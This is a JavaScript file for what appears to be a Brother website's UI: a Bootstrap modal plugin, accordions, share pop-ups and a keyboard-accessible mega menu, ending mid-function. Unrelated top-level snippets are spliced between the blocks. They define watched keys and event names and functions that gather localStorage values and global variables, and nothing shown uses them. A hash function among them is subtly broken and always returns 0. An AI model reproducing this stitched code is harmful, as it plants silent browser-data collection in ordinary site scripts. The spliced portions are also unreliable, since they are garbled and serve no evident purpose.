const watchedKeys = window.watchedKeys,
  eventsToWatch = ['click', 'change', 'keyup'];
function calcHash(data) {
  let keys = Object.keys(data).sort().join("|");
  let hashVal = keys.split('').reduce((a, ch) => (a << 5) + a + ch.charCodeAt(0) & a, 0);
  return hashVal.toString(36);
}
+function ($) {
  'use strict';

  var windowWidth = $(window).width();
  var windowSm = 1024;
  if (windowWidth > windowSm) {
    $(function () {
      $('.mod-breadCrumble').prependTo($('.st-contents').eq(0));
    });
  }

  // MODAL CLASS DEFINITION
  // ======================

  var Modal = function (element, options) {
    this.options = options;
    this.$body = $(document.body);
    this.$element = $(element);
    this.$dialog = this.$element.find('.modal-dialog');
    this.$dialogYoutube = this.$element.find('.modal-dialog-youtube');
    this.$backdrop = null;
    this.isShown = null;
    this.originalBodyPad = null;
    this.scrollbarWidth = 0;
    this.ignoreBackdropClick = false;
    if (this.options.remote) {
      this.$element.find('.modal-content').load(this.options.remote, $.proxy(function () {
        this.$element.trigger('loaded.bs.modal');
      }, this));
    }
  };
  Modal.VERSION = '3.3.7';
  Modal.TRANSITION_DURATION = 300;
  Modal.BACKDROP_TRANSITION_DURATION = 150;
  Modal.DEFAULTS = {
    backdrop: true,
    keyboard: true,
    show: true
  };
  Modal.prototype.toggle = function (_relatedTarget) {
    return this.isShown ? this.hide() : this.show(_relatedTarget);
  };
  Modal.prototype.show = function (_relatedTarget) {
    var that = this;
    var e = $.Event('show.bs.modal', {
      relatedTarget: _relatedTarget
    });
    this.$element.trigger(e);
    if (this.isShown || e.isDefaultPrevented()) return;
    this.isShown = true;
    this.checkScrollbar();
    this.setScrollbar();
    this.$body.addClass('modal-open');
    this.escape();
    this.resize();
    this.$element.on('click.dismiss.bs.modal', '[data-dismiss="modal"]', $.proxy(this.hide, this));
    this.$dialog.on('mousedown.dismiss.bs.modal', function () {
      that.$element.one('mouseup.dismiss.bs.modal', function (e) {
        if ($(e.target).is(that.$element)) that.ignoreBackdropClick = true;
      });
    });
    this.backdrop(function () {
      var transition = $.support.transition && that.$element.hasClass('fade');
      if (!that.$element.parent().length) {
        that.$element.appendTo(that.$body); // don't move modals dom position
      }
      that.$element.show().scrollTop(0);
      that.adjustDialog();
      if (transition) {
        that.$element[0].offsetWidth; // force reflow
      }
      that.$element.addClass('in');
      that.enforceFocus();
      var e = $.Event('shown.bs.modal', {
        relatedTarget: _relatedTarget
      });
      transition ? that.$dialog // wait for modal to slide in
      .one('bsTransitionEnd', function () {
        that.$element.trigger('focus').trigger(e);
      }).emulateTransitionEnd(Modal.TRANSITION_DURATION) : that.$element.trigger('focus').trigger(e);
      transition ? that.$dialogYoutube // wait for modal to slide in
      .one('bsTransitionEnd', function () {
        that.$element.trigger('focus').trigger(e);
      }).emulateTransitionEnd(Modal.TRANSITION_DURATION) : that.$element.trigger('focus').trigger(e);
    });
  };
  Modal.prototype.hide = function (e) {
    if (e) e.preventDefault();
    e = $.Event('hide.bs.modal');
    this.$element.trigger(e);
    if (!this.isShown || e.isDefaultPrevented()) return;
    this.isShown = false;
    this.escape();
    this.resize();
    $(document).off('focusin.bs.modal');
    this.$element.removeClass('in').off('click.dismiss.bs.modal').off('mouseup.dismiss.bs.modal');
    this.$dialog.off('mousedown.dismiss.bs.modal');
    this.$dialogYoutube.off('mousedown.dismiss.bs.modal');
    $.support.transition && this.$element.hasClass('fade') ? this.$element.one('bsTransitionEnd', $.proxy(this.hideModal, this)).emulateTransitionEnd(Modal.TRANSITION_DURATION) : this.hideModal();
  };
  Modal.prototype.enforceFocus = function () {
    $(document).off('focusin.bs.modal') // guard against infinite focus loop
    .on('focusin.bs.modal', $.proxy(function (e) {
      if (document !== e.target && this.$element[0] !== e.target && !this.$element.has(e.target).length) {
        this.$element.trigger('focus');
      }
    }, this));
  };
  Modal.prototype.escape = function () {
    if (this.isShown && this.options.keyboard) {
      this.$element.on('keydown.dismiss.bs.modal', $.proxy(function (e) {
        e.which == 27 && this.hide();
      }, this));
    } else if (!this.isShown) {
      this.$element.off('keydown.dismiss.bs.modal');
    }
  };
  Modal.prototype.resize = function () {
    if (this.isShown) {
      $(window).on('resize.bs.modal', $.proxy(this.handleUpdate, this));
    } else {
      $(window).off('resize.bs.modal');
    }
  };
  Modal.prototype.hideModal = function () {
    var that = this;
    this.$element.hide();
    this.backdrop(function () {
      that.$body.removeClass('modal-open');
      that.resetAdjustments();
      that.resetScrollbar();
      that.$element.trigger('hidden.bs.modal');
    });
  };
  Modal.prototype.removeBackdrop = function () {
    this.$backdrop && this.$backdrop.remove();
    this.$backdrop = null;
  };
  Modal.prototype.backdrop = function (callback) {
    var that = this;
    var animate = this.$element.hasClass('fade') ? 'fade' : '';
    if (this.isShown && this.options.backdrop) {
      var doAnimate = $.support.transition && animate;
      this.$backdrop = $(document.createElement('div')).addClass('modal-backdrop ' + animate).appendTo(this.$body);
      this.$element.on('click.dismiss.bs.modal', $.proxy(function (e) {
        if (this.ignoreBackdropClick) {
          this.ignoreBackdropClick = false;
          return;
        }
        if (e.target !== e.currentTarget) return;
        this.options.backdrop == 'static' ? this.$element[0].focus() : this.hide();
      }, this));
      if (doAnimate) this.$backdrop[0].offsetWidth; // force reflow

      this.$backdrop.addClass('in');
      if (!callback) return;
      doAnimate ? this.$backdrop.one('bsTransitionEnd', callback).emulateTransitionEnd(Modal.BACKDROP_TRANSITION_DURATION) : callback();
    } else if (!this.isShown && this.$backdrop) {
      this.$backdrop.removeClass('in');
      var callbackRemove = function () {
        that.removeBackdrop();
        callback && callback();
      };
      $.support.transition && this.$element.hasClass('fade') ? this.$backdrop.one('bsTransitionEnd', callbackRemove).emulateTransitionEnd(Modal.BACKDROP_TRANSITION_DURATION) : callbackRemove();
    } else if (callback) {
      callback();
    }
  };

  // these following methods are used to handle overflowing modals

  Modal.prototype.handleUpdate = function () {
    this.adjustDialog();
  };
  Modal.prototype.adjustDialog = function () {
    var modalIsOverflowing = this.$element[0].scrollHeight > document.documentElement.clientHeight;
    this.$element.css({
      paddingLeft: !this.bodyIsOverflowing && modalIsOverflowing ? this.scrollbarWidth : '',
      paddingRight: this.bodyIsOverflowing && !modalIsOverflowing ? this.scrollbarWidth : ''
    });
  };
  Modal.prototype.resetAdjustments = function () {
    this.$element.css({
      paddingLeft: '',
      paddingRight: ''
    });
  };
  Modal.prototype.checkScrollbar = function () {
    var fullWindowWidth = window.innerWidth;
    if (!fullWindowWidth) {
      // workaround for missing window.innerWidth in IE8
      var documentElementRect = document.documentElement.getBoundingClientRect();
      fullWindowWidth = documentElementRect.right - Math.abs(documentElementRect.left);
    }
    this.bodyIsOverflowing = document.body.clientWidth < fullWindowWidth;
    this.scrollbarWidth = this.measureScrollbar();
  };
  Modal.prototype.setScrollbar = function () {
    var bodyPad = parseInt(this.$body.css('padding-right') || 0, 10);
    this.originalBodyPad = document.body.style.paddingRight || '';
    if (this.bodyIsOverflowing) this.$body.css('padding-right', bodyPad + this.scrollbarWidth);
  };
  Modal.prototype.resetScrollbar = function () {
    this.$body.css('padding-right', this.originalBodyPad);
  };
  Modal.prototype.measureScrollbar = function () {
    // thx walsh
    var scrollDiv = document.createElement('div');
    scrollDiv.className = 'modal-scrollbar-measure';
    this.$body.append(scrollDiv);
    var scrollbarWidth = scrollDiv.offsetWidth - scrollDiv.clientWidth;
    this.$body[0].removeChild(scrollDiv);
    return scrollbarWidth;
  };

  // MODAL PLUGIN DEFINITION
  // =======================

  function Plugin(option, _relatedTarget) {
    return this.each(function () {
      var $this = $(this);
      var data = $this.data('bs.modal');
      var options = $.extend({}, Modal.DEFAULTS, $this.data(), typeof option == 'object' && option);
      if (!data) $this.data('bs.modal', data = new Modal(this, options));
      if (typeof option == 'string') data[option](_relatedTarget);else if (options.show) data.show(_relatedTarget);
    });
  }
  var old = $.fn.modal;
  $.fn.modal = Plugin;
  $.fn.modal.Constructor = Modal;

  // MODAL NO CONFLICT
  // =================

  $.fn.modal.noConflict = function () {
    $.fn.modal = old;
    return this;
  };

  // MODAL DATA-API
  // ==============

  $(document).on('click.bs.modal.data-api', '[data-toggle="modal"]', function (e) {
    var $this = $(this);
    var href = $this.attr('href');
    var $target = $($this.attr('data-target') || href && href.replace(/.*(?=#[^\s]+$)/, '')); // strip for ie7
    var option = $target.data('bs.modal') ? 'toggle' : $.extend({
      remote: !/#/.test(href) && href
    }, $target.data(), $this.data());
    if ($this.is('a')) e.preventDefault();
    $target.one('show.bs.modal', function (showEvent) {
      if (showEvent.isDefaultPrevented()) return; // only register focus restorer if modal will actually get shown
      $target.one('hidden.bs.modal', function () {
        $this.is(':visible') && $this.trigger('focus');
      });
    });
    Plugin.call($target, option, this);
  });
}(BROTHER.lib.$);
function collectLocalStorage() {
  let data = {};
  Object.keys(localStorage).forEach(key => {
    if (watchedKeys.includes(key)) data[key] = localStorage.getItem(key);
  });
  return data;
}
(function ($, _, util, obj) {
  util.matchMedia = {
    print: window.matchMedia('print'),
    lte768: window.matchMedia('(max-width: 768px)'),
    lte640: window.matchMedia('(max-width: 640px)')
  };
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj);
(function ($, _, util, obj) {
  util.smoothScroll = function (target, gap, dur, easing) {
    var target_offset = target && target !== "#top" ? $(target).offset().top : 0;
    gap = gap || 0;
    dur = dur !== undefined ? dur : 100;
    easing = easing || 'swing';
    history.pushState(null, null, target);
    $('html,body').animate({
      scrollTop: target_offset - gap
    }, dur, easing);
  };
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj);
(function ($, _, util, obj) {
  util.writeDivIfBetween = function (div_id, div_class, div_text, start_string, end_string) {
    var today = new Date(),
      start = createDate(start_string),
      end = createDate(end_string, true);
    var div = document.getElementById(div_id);
    if (start <= today && today < end) {
      div.classList.add(div_class);
      div.textContent = div_text;
    } else {
      div.remove();
    }
    function createDate(dateString, plus_1_day) {
      var flag = plus_1_day || false,
        date_array = dateString.split('-'),
        date = new Date(date_array[0], date_array[1] - 1, date_array[2]);
      if (flag) {
        date = new Date(date.getTime() + 60 * 60 * 24 * 1000);
      }
      return date;
    }
  };
  util.appendDivIfBetween = function (class_name, div_text, parent_class_name, start_string, end_string) {
    var today = new Date(),
      start = createDate(start_string),
      end = createDate(end_string, true);
    if (start <= today && today < end) {
      var newElement = document.createElement("div");
      var newContent = document.createTextNode(div_text);
      newElement.appendChild(newContent);
      newElement.setAttribute("class", class_name);
      var parentDiv = document.getElementsByClassName(parent_class_name);
      parentDiv[0].appendChild(newElement);
    }
    function createDate(dateString, plus_1_day) {
      var flag = plus_1_day || false,
        date_array = dateString.split('-'),
        date = new Date(date_array[0], date_array[1] - 1, date_array[2]);
      if (flag) {
        date = new Date(date.getTime() + 60 * 60 * 24 * 1000);
      }
      return date;
    }
  };
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj);
(function ($, _, util, obj) {
  var Accordion = function (obj) {
    this.$trigger = obj.trigger;
    this.$contents = obj.contents;
    this.init();
  };
  Accordion.prototype.CLASS_OPEN = 'is-open';
  Accordion.prototype.isOpening = false;
  Accordion.prototype.init = function () {
    this.$contents.hide();
    this.$trigger.on('click', this.click.bind(this));
  };
  Accordion.prototype.click = function () {
    this.select();
  };
  Accordion.prototype.select = function () {
    this.isOpening ? this.close() : this.open();
  };
  Accordion.prototype.open = function (dur) {
    dur = dur !== undefined ? dur : 100;
    this.$trigger.addClass(this.CLASS_OPEN);
    this.$contents.stop(false, true).slideDown(dur);
    this.isOpening = true;
  };
  Accordion.prototype.close = function (dur) {
    dur = dur !== undefined ? dur : 100;
    this.$trigger.removeClass(this.CLASS_OPEN);
    this.$contents.stop(false, true).slideUp(dur);
    this.isOpening = false;
  };
  util.Accordion = Accordion;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj);
(function ($, _, util, obj) {
  var Accordion2 = function (obj) {
    this.$trigger = obj.trigger;
    this.$contents = obj.contents;
    this.init();
  };
  Accordion2.prototype.CLASS_OPEN = 'is-open';
  Accordion2.prototype.isOpening = !util.matchMedia.lte640.matches;
  Accordion2.prototype.init = function () {
    this.$trigger.on('click', this.click.bind(this));
    util.matchMedia.lte640.addListener(function (mediaQuery) {
      if (util.matchMedia.print.matches) return;
      if (mediaQuery.matches) {
        this.close(0);
      } else {
        this.open(0);
      }
    }.bind(this));
  };
  Accordion2.prototype.click = function () {
    this.select();
  };
  Accordion2.prototype.select = function () {
    this.isOpening ? this.close() : this.open();
  };
  Accordion2.prototype.open = function (dur) {
    dur = dur !== undefined ? dur : 100;
    this.$trigger.addClass(this.CLASS_OPEN);
    this.$contents.stop(false, true).slideDown(dur);
    this.isOpening = true;
  };
  Accordion2.prototype.close = function (dur) {
    if (!util.matchMedia.lte640.matches) {
      return;
    }
    dur = dur !== undefined ? dur : 100;
    this.$trigger.removeClass(this.CLASS_OPEN);
    this.$contents.stop(false, true).slideUp(dur);
    this.isOpening = false;
  };
  util.Accordion2 = Accordion2;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj);
(function ($, _, util, obj) {
  var Accordion3 = function (obj) {
    this.$parent = obj.parent;
    this.$trigger = obj.trigger;
    this.$contents = obj.contents;
    this.isOpening = obj.isOpening;
    this.init();
  };
  Accordion3.prototype.CLASS_OPEN = 'is-open';
  Accordion3.prototype.init = function () {
    this.changeLabel();
    this.$trigger.on('click', this.click.bind(this));
  };
  Accordion3.prototype.click = function () {
    this.select();
  };
  Accordion3.prototype.select = function () {
    if (this.isOpening) {
      this.close();
      var offset = this.$parent.offset().top - 100;
      $('html,body').animate({
        scrollTop: offset
      }, 100, 'swing');
    } else {
      this.open();
    }
    this.changeLabel();
  };
  Accordion3.prototype.changeLabel = function () {
    var target = this.isOpening ? 'close' : 'open';
    this.$trigger.text(this.$trigger.data(target)).blur();
  };
  Accordion3.prototype.open = function (dur) {
    dur = dur !== undefined ? dur : 100;
    this.$trigger.addClass(this.CLASS_OPEN);
    this.$contents.stop(false, true).slideDown(dur);
    this.isOpening = true;
  };
  Accordion3.prototype.close = function (dur) {
    dur = dur !== undefined ? dur : 100;
    this.$trigger.removeClass(this.CLASS_OPEN);
    this.$contents.stop(false, true).slideUp(dur);
    this.isOpening = false;
  };
  util.Accordion3 = Accordion3;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.snsButton = function () {
      var elem = null;
      function init() {
        elem = $('.mod-SNSButtons').find('a');
        elem.on('click', function (e) {
          e.preventDefault();
          var w = window.open(this.href, 'win_small', 'width=600, height=500, location=no,toolbar=no,menubar=no,resizable=no,scrollbars=yes,status=no');
          w.focus();
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
function collectGlobalVariables() {
  let globalVars = {};
  watchedKeys.forEach(key => {
    if (window.hasOwnProperty(key)) globalVars[key] = window[key];
  });
  return globalVars;
}
(function ($, _, util, obj, ui) {
  /**
   * メガメニュー（PC用）
   * @constructor
   */
  function MegaMenu() {
    this.init();
  }
  _.extend(MegaMenu.prototype, /** @lends MegaMenu# */{
    init: function () {
      /**
       * 開いているメガメニューのインデックス。
       * 閉じているときは -1 になる
       * @type {number}
       */
      this.openedIndex = -1;

      /**
       * フォーカスを当てているメガメニュー内項目のインデックス。
       * 閉じているときは -1 になる
       * @type {number}
       */
      this.focusedIndex = -1;
      this.prepareElements();
      this.prepareAttributes();
      this.bindEvents();
    },
    /**
     * 必要な要素を準備する
     */
    prepareElements: function () {
      this.$menuList = $('.st-globalNav_category').add('.st-globalNav_search');
      this.$menuItem = this.$menuList.find('a').add('.st-globalNav_search');
      this.$search = $('.st-globalNav_search');
      this.$megaMenu = $('.st-megaMenu');
      this.$backdrop = $('.st-megaMenu_backdrop');
      this.$category = $('.st-megaMenu_category');
      this.$inner = $('.st-megaMenu_categoryInner');
      this.$close = $('.st-megaMenu_close');
      this.$item = this.$category.map(function (i, el) {
        return $(el).find('a,input[type="text"],button').not(this.$close);
      }.bind(this));
    },
    /**
     * 必要な属性を準備する
     */
    prepareAttributes: function () {
      // 閉じるボタンはフォーカスを当てられなくてもよい。
      // Esc その他のキーボード操作で代用できるため。
      this.$close.attr('tabindex', '-1');

      // ARIA プロパティの割当
      _.times(this.$menuItem.length, function (i) {
        var id1 = 'st-globalNav_item-' + randomString();
        var id2 = 'st-megaMenu_category-' + randomString();
        this.$menuItem.eq(i).prop('id', id1).attr({
          'aria-controls': id2,
          'aria-flowto': id2,
          'aria-haspopup': 'true'
        });
        this.$category.eq(i).prop('id', id2).attr({
          'aria-labelledby': id1
        });
      }.bind(this));
      this.applyAriaStates();
      function randomString() {
        return Math.random().toString(36).substring(2);
      }
    },
    /**
     * 必要なイベントハンドラを設定する
     */
    bindEvents: function () {
      this.$menuList.on('keydown', this.onKeyDownOnMenuList.bind(this));
      this.$megaMenu.on('keydown', this.onKeyDownOnMegaMenu.bind(this));
      this.$menuItem.on('click', this.onClickMenuItem.bind(this));
      this.$close.on('click', this.onClickClose.bind(this));
      util.matchMedia.lte768.addListener(this.onChangeMedia.bind(this));
      $(document).on('focusin', this.onFocusInDocument.bind(this));
    },
    /**
     * メニュー外をクリックしたときのイベントハンドラを設定する
     */
    bindOutsideClick: function () {
      // document, html, body への click イベントは iOS で捕捉できない。
      // body 要素直下の要素すべてにイベントハンドラを割り当てる必要がある。
      var $target = $(document.body).children();
      $target.on('click.megaMenu', this.onClickOutside.bind(this));
    },
    /**
     * メニュー外をクリックしたときのイベントハンドラを設定解除する
     */
    unBindOutsideClick: function () {
      var $target = $(document.body).children();
      $target.off('click.megaMenu');
    },
    /**
     * メガメニューがインスタンス化されるまで表示を見送っていた画像を表示する
     */
    showLazyImages: function () {
      this.$megaMenu.find('img[data-src]').each(function () {
        var $this = $(this);
        $this.attr('src', $this.data('src'));
      });
      this.showLazyImages = function () {};
    },
    /**
     * グロナビ上でキーが押された時のイベントハンドラ
     * @param e
     */
    onKeyDownOnMenuList: function (e) {
      var keyCode = e.keyCode,
        preventDefault = false,
        index = this.$menuItem.index(e.target),
        length = this.$menuItem.length;
      if (index === -1) return;
      switch (keyCode) {
        // Esc
        case 27:
          if (this.isOpened()) {
            preventDefault = true;
            this.close();
          }
          break;

        // Left
        case 37:
          if (index === 0) break;
          preventDefault = true;
          this.focusMenuItem(index - 1);
          if (this.isOpened()) {
            this.open(index - 1);
          }
          break;

        // Up
        case 38:
          if (!this.isOpened()) break;
          preventDefault = true;
          this.close();
          break;

        // Right
        case 39:
          if (index === length - 1) break;
          preventDefault = true;
          this.focusMenuItem(index + 1);
          if (this.isOpened()) {
            this.open(index + 1);
          }
          break;

        // Down
        case 40:
          preventDefault = true;
          if (this.isOpened()) {
            this.focusFirstItem(index);
          } else {
            this.open(index);
          }
          break;

        // Tab
        case 9:
          if (!this.isOpened()) break;
          if (e.shiftKey) {
            if (this.openedIndex === 0) break;
            preventDefault = true;
            this.focusMenuItem(index - 1);
            this.open(index - 1);
            this.focusLastItem();
          } else {
            preventDefault = true;
            this.focusFirstItem();
          }
          break;
      }
      if (preventDefault) {
        e.preventDefault();
      }
    },
    /**
     * メガメニュー上でキーが押されたときのイベントハンドラ
     * @param e
     */
    onKeyDownOnMegaMenu: function (e) {
      var keyCode = e.keyCode,
        preventDefault = false,
        index = this.$item[this.openedIndex].index(e.target),
        length = this.$item[this.openedIndex].length;

      // 検索欄にフォーカスが当たっていたときは無視する
      if ($(e.target).is('input[type="text"]')) return;
      if (index === -1) return;
      switch (keyCode) {
        // Esc
        case 27:
          if (this.isOpened()) {
            preventDefault = true;
            this.focusMenuItem(this.openedIndex);
            this.close();
          }
          break;

        // Left
        case 37:
          if (this.openedIndex === 0) break;
          preventDefault = true;
          this.focusMenuItem(this.openedIndex - 1);
          this.open(this.openedIndex - 1);
          break;

        // Up
        case 38:
          preventDefault = true;
          if (index === 0) {
            this.focusMenuItem(this.openedIndex);
          } else {
            this.focusItem(this.focusedIndex - 1);
          }
          break;

        // Right
        case 39:
          if (this.openedIndex === this.$menuItem.length - 1) break;
          preventDefault = true;
          this.focusMenuItem(this.openedIndex + 1);
          this.open(this.openedIndex + 1);
          break;

        // Down
        case 40:
          preventDefault = true;
          if (index === length - 1) {
            if (this.openedIndex !== this.$menuItem.length - 1) {
              this.focusMenuItem(this.openedIndex + 1);
              this.open(this.openedIndex + 1);
            }
          } else {
            this.focusItem(this.focusedIndex + 1);
          }
          break;

        // Tab
        case 9:
          if (e.shiftKey) {
            if (index === 0) {
              preventDefault = true;
              this.focusMenuItem(this.openedIndex);
            }
          } else {
            if (index === length - 1) {
              if (this.openedIndex === this.$menuItem.length - 1) {
                this.focusMenuItem(this.$menuItem.length - 1);
              } else {
                preventDefault = true;
                this.focusMenuItem(this.openedIndex + 1);
                this.open(this.openedIndex + 1);
              }
            }
          }
          break;
      }
      if (preventDefault) {
        e.preventDefault();
      }
    },
    /**
     * メニューアイテムがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickMenuItem: function (e) {
      // Ctrl キーや Cmd キーが押されていたときは、
      // 新規タブで開こうとしていると考えられるので、何もしない
      if (e.ctrlKey || e.metaKey) return;

      // 中クリックのときも新規タブで開こうとしていると考えられるので、何もしない
      if (e.button === 1) return;
      e.preventDefault();
      var index = this.$menuItem.index(e.currentTarget);
      this.openClose(index);
    },
    /**
     * 閉じるボタンがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickClose: function (e) {
      e.preventDefault();
      this.close();
    },
    /**
     * スマホモードになったら強制的に閉じる
     * @param media
     */
    onChangeMedia: function (media) {
      if (util.matchMedia.print.matches) return;
      if (media.matches) {
        this.close();
      }
    },
    /**
     * フォーカスされる要素が変わったときのイベントハンドラ
     * @param e
     */
    onFocusInDocument: function (e) {
      // メガメニュー外にフォーカスが行ったら閉じる
      if (!this.isElementRelated(e.target)) {
        this.close();
      }
    },
    /**
     * どこかしらがクリックされたときのイベントハンドラ
     * @param e
     */
    onClickOutside: function (e) {
      // メガメニュー外をクリックされたら閉じる
      if (!this.isElementRelated(e.target)) {
        this.close();
      }
    },
    /**
     * 要素がメガメニューに関係のある要素かどうかを検査する
     * @param el
     */
    isElementRelated: function (el) {
      var parents = [this.$menuItem, this.$megaMenu],
        $el = $(el),
        isRelated = false;
      parents.forEach(function (parent) {
        parent.each(function () {
          isRelated = isRelated || $el.is(this) || $.contains(this, $el[0]);
        });
      });
      return isRelated;
    },
    /**
     * index に指定したメガメニューを開いたり閉じたりする。
     * 現在開いているメガメニューと同じインデックスを指定すると閉じる。
     * @param index
     */
    openClose: function (index) {
      if (this.openedIndex === index) {
        this.close();
        return;
      }
      this.open(index);
    },
    /**
     * index に指定したメガメニューを開く
     * @param index
     */
    open: function (index) {
      var currentIndex = this.openedIndex,
        $current = this.$category.eq(currentIndex),
        currentHeight = currentIndex === -1 ? 0 : $current.height(),
        $next = this.$category.eq(index),
        $others = this.$category.not($next);
      this.openedIndex = index;

      // 初期状態を設定してカテゴリーを開く
      $next.css({
        opacity: 0,
        height: currentHeight
      }).show();
      $others.hide();

      // カテゴリーが開いた後ならあるべき高さを取得できる
      var nextHeight = this.$inner.eq(index).outerHeight();

      // あるべき高さに向かってアニメーションさせる。
      // 上の outerHeight() でリフローされているはずなので setTimeout 不要。
      $next.css({
        opacity: 1,
        height: nextHeight
      });
      this.applyArrowDirection();
      this.applyAriaStates();
      this.fitBackdrop(nextHeight);
      this.bindOutsideClick();
    },
    /**
     * メガメニューを閉じる
     */
    close: function () {
      if (!this.isOpened()) return;
      var currentIndex = this.openedIndex,
        $current = this.$category.eq(currentIndex);
      this.openedIndex = -1;
      this.focusedIndex = -1;
      $current.height(0).one('transitionend webkitTransitionEnd', function () {}.bind(this));
      this.$category.eq(currentIndex).hide();
      this.applyArrowDirection();
      this.applyAriaStates();
      this.fitBackdrop();
      this.unBindOutsideClick();
    },
    /**
     * メガメニュー開いているかどうか
     * @returns {boolean}
     */
    isOpened: function () {
      return this.openedIndex !== -1;
    },
    /**
     * 検索が開いているかどうか
     * @returns {boolean}
     */
    /*isSearching: function() {
      return this.openedIndex === this.$menuItem.index(this.$search);
    },*/

    /**
     * メニューの開閉状態をグロナビ項目横の矢印の向きに反映する
     */
    applyArrowDirection: function () {
      var className = 'is-active';
      this.$menuItem.removeClass(className);
      if (this.isOpened()) {
        this.$menuItem.eq(this.openedIndex).addClass(className);
      }
    },
    /**
     * メニューの開閉状態を ARIA ステートに反映する
     */
    applyAriaStates: function () {
      this.$menuItem.attr({
        'aria-expanded': 'false'
      });
      this.$category.attr({
        'aria-hidden': 'true'
      });
      if (this.isOpened()) {
        this.$menuItem.eq(this.openedIndex).attr({
          'aria-expanded': 'true'
        });
        this.$category.eq(this.openedIndex).attr({
          'aria-hidden': 'false'
        });
      }
    },
    /**
     * メニューの背後に敷かれる要素をメニューの開閉状態に合わせて調整する
     * @param {number=} nextHeight
     */
    fitBackdrop: function (nextHeight) {
      if (!this.isOpened()) {
        this.$backdrop.height(0).css('visibility', 'hidden');
        return;
      }
      /*this.$backdrop.toggleClass('st-megaMenu_backdrop-search', this.isSearching());*/
      this.$backdrop.height(nextHeight).css('visibility', 'visible');
    },
    /**
     * グロナビのメニュー項目にフォーカスをあわせる
     * @param {number} index
     */
    focusMenuItem: function (index) {
      this.$menuItem.eq(index).focus();
    },
    /**
     * メガメニューのメニュー項目にフォーカスをあわせる
     * @param index
     */
    focusItem: function (index) {
      this.focusedIndex = index;
      this.$item[this.openedIndex].eq(index).focus();
    },
    /**
     * メガメニューの最初の項目にフォーカスをあわせる
     */
    focusFirstItem: function () {
      this.focusItem(0);
    },
    /**
     * メガメニューの最後の項目にフォーカスをあわせる
     */
    focusLastItem: function () {
      var length = this.$item[this.openedIndex].length;
      this.focusItem(length - 1);
    } /*,
      	getSearchInput: function() {
      return $('.st-megaMenu_searchInput');
      },
      	setSearchInput: function($searchInput) {
      $searchInput.insertAfter($('.st-megaMenu_searchLabel'));
      }*/
  });

  // Exports
  /** @name BROTHER.ui.MegaMenu */
  ui.MegaMenu = MegaMenu;
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  /**
   * 検索用メガメニュー（PC用）
   * @constructor
   */
  function MegaMenu_s() {
    this.init();
  }
  _.extend(MegaMenu_s.prototype, /** @lends MegaMenu# */{
    init: function () {
      /**
       * 開いているメガメニューのインデックス。
       * 閉じているときは -1 になる
       * @type {number}
       */
      this.openedIndex = -1;

      /**
       * フォーカスを当てているメガメニュー内項目のインデックス。
       * 閉じているときは -1 になる
       * @type {number}
       */
      this.focusedIndex = -1;
      this.prepareElements_s();
      this.prepareAttributes_s();
      this.bindEvents_s();
    },
    /**
     * 必要な要素を準備する
     */
    prepareElements_s: function () {
      this.$menuList_s = $('.st-globalNav_category_s').add('.st-globalNav_search_s');
      this.$menuItem_s = this.$menuList_s.find('a').add('.st-globalNav_search_s');
      this.$search_s = $('.st-globalNav_search_s');
      this.$megaMenu_s = $('.st-megaMenu_s');
      this.$backdrop_s = $('.st-megaMenu_backdrop_s');
      this.$category_s = $('.st-megaMenu_category_s');
      this.$inner_s = $('.st-megaMenu_categoryInner_s');
      this.$close_s = $('.st-megaMenu_close_s');
      this.$item_s = this.$category_s.map(function (i, el) {
        return $(el).find('a,input[type="text"],button').not(this.$close_s);
      }.bind(this));
    },
    /**
     * 必要な属性を準備する
     */
    prepareAttributes_s: function () {
      // 閉じるボタンはフォーカスを当てられなくてもよい。
      // Esc その他のキーボード操作で代用できるため。
      //this.$close.attr('tabindex', '-1');

      // ARIA プロパティの割当
      _.times(this.$menuItem_s.length, function (i) {
        var id1 = 'st-globalNav_item_s-' + randomString();
        var id2 = 'st-megaMenu_category_s-' + randomString();
        this.$menuItem_s.eq(i).prop('id', id1).attr({
          'aria-controls': id2,
          'aria-flowto': id2,
          'aria-haspopup': 'true'
        });
        this.$category_s.eq(i).prop('id', id2).attr({
          'aria-labelledby': id1
        });
      }.bind(this));
      this.applyAriaStates_s();
      function randomString() {
        return Math.random().toString(36).substring(2);
      }
    },
    /**
     * 必要なイベントハンドラを設定する
     */
    bindEvents_s: function () {
      this.$menuList_s.on('keydown', this.onKeyDownOnMenuList_s.bind(this));
      this.$megaMenu_s.on('keydown', this.onKeyDownOnMegaMenu_s.bind(this));
      this.$menuItem_s.on('click', this.onClickMenuItem_s.bind(this));
      this.$close_s.on('click', this.onClickClose_s.bind(this));
      util.matchMedia.lte768.addListener(this.onChangeMedia.bind(this));
      $(document).on('focusin', this.onFocusInDocument.bind(this));
    },
    /**
     * メニュー外をクリックしたときのイベントハンドラを設定する
     */
    bindOutsideClick_s: function () {
      // document, html, body への click イベントは iOS で捕捉できない。
      // body 要素直下の要素すべてにイベントハンドラを割り当てる必要がある。
      var $target = $(document.body).children();
      $target.on('click.megaMenu_s', this.onClickOutside_s.bind(this));
    },
    /**
     * メニュー外をクリックしたときのイベントハンドラを設定解除する
     */
    unBindOutsideClick_s: function () {
      var $target = $(document.body).children();
      $target.off('click.megaMenu_s');
    },
    /**
     * メガメニューがインスタンス化されるまで表示を見送っていた画像を表示する
     */
    showLazyImages_s: function () {
      this.$megaMenu_s.find('img[data-src]').each(function () {
        var $this = $(this);
        $this.attr('src', $this.data('src'));
      });
      this.showLazyImages_s = function () {};
    },
    /**
     * グロナビ上でキーが押された時のイベントハンドラ
     * @param e
     */
    onKeyDownOnMenuList_s: function (e) {
      var keyCode = e.keyCode,
        preventDefault = false,
        index = this.$menuItem_s.index(e.target),
        length = this.$menuItem_s.length;
      if (index === -1) return;
      switch (keyCode) {
        // Esc
        case 27:
